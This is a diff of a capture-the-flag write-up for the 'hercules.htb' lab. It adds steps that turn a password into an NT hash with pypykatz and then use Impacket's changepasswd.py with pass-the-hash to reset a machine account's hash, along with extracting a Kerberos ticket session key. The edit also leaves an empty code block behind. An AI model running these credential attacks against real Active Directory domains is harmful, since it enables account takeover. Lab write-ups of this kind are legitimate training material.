@@ -1607,7 +1607,14 @@ describeTicket.py iis_webserver\$.ccache | grep 'Ticket Session Key'
 Ill then pull out the ticket session key from my TGT
 
 ```python
-changepasswd.py -newhashes ':3b21cb7d31a60a9f6dbe664a23c58d8166dcb28cd91293a5ac8366d2f2433663' -k -hashes ':2b576acbe6bcfda7294d6bd18041b8fe' 'hercules.htb/iis_webserver$@dc.hercules.htb'
+pypykatz crypto nt 'Password123!'
+2b576acbe6bcfda7294d6bd18041b8fe
+```
+
+Then convert the current password to an NT hash
+
+```python
+changepasswd.py -newhashes ':a9f4d76cdc5ba32d6e0763da9d106eb7' -k -hashes ':2b576acbe6bcfda7294d6bd18041b8fe' 'hercules.htb/iis_webserver$@dc.hercules.htb'                                
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Changing the password of hercules.htb\iis_webserver$
@@ -1618,7 +1625,9 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 Ill then use the NTLM hash and set the session key to the new hash
 
+```python
 
+```
 
 
 
